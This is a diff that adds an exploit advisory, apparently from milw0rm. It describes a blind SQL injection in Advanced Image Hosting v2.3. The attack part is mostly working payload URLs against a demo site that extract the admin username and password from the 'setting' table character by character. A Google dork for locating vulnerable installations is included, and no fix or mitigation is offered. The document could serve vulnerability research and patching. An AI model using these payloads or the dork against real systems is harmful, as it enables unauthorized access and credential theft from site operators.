@@ -1,0 +1,47 @@
+###################################################################
+Advanced Image Hosting (AIH) Remote Blind SQL Injection 
+###################################################################
+
+
+###################################################
+#[~] Author        :  boom3rang 
+#[~] Greetz        :  H!tm@N, KHG, chs, redc00de
+#[~] Vulnerability :  Blind SQL injection 
+#[~] Google Dork   :  Powered by: AIH v2.3
+--------------------------------------------------
+#[!] Product Name  :  Advanced Image Hosting    
+#[!] Product Site  :  http://www.yabsoft.info
+#[!] Version       :  v2.3
+#[!] Download      :  http://yabsoft.com/aihs-feature.php
+###################################################
+
+[!] AIH Blind SQL Injection.
+
+PoC / Live Demo:
+-------------
+http://yabsoft.info/demo/aihspro/gallery_list.php?gal=3'/**/and/**/ascii(substring((select/**/concat(admin,0x3a,pass)/**/from/**/setting/**/limit/**/0,1),1,1))>100--++
+
+First charcter of the username is char(100) -->  char="d"
+-------------
+http://yabsoft.info/demo/aihspro/gallery_list.php?gal=3'/**/and/**/ascii(substring((select/**/concat(admin,0x3a,pass)/**/from/**/setting/**/limit/**/0,1),2,1))>101--++
+
+Second charter of the username is char(101) -->  char2="e"
+-------------
+http://yabsoft.info/demo/aihspro/gallery_list.php?gal=3'/**/and/**/ascii(substring((select/**/concat(admin,0x3a,pass)/**/from/**/setting/**/limit/**/0,1),3,1))>109--++
+
+Next charter of the username is char(109) --> char3="m"
+-------------
+http://yabsoft.info/demo/aihspro/gallery_list.php?gal=3'/**/and/**/ascii(substring((select/**/concat(admin,0x3a,pass)/**/from/**/setting/**/limit/**/0,1),4,1))>111--++
+
+And The last charter of the username is char(111) --> char4="o"
+-------------
+Like we see the username is "demo" now you can continue finding another charters for password, changing the number of charters 5,6,7,8,9,10........?>
+
+
+##############################
+#[!] Proud 2 be Albanian
+#[!] Proud 2 be Muslim
+#[!] United States of Albania
+##############################
+
+# milw0rm.com [2009-03-18]
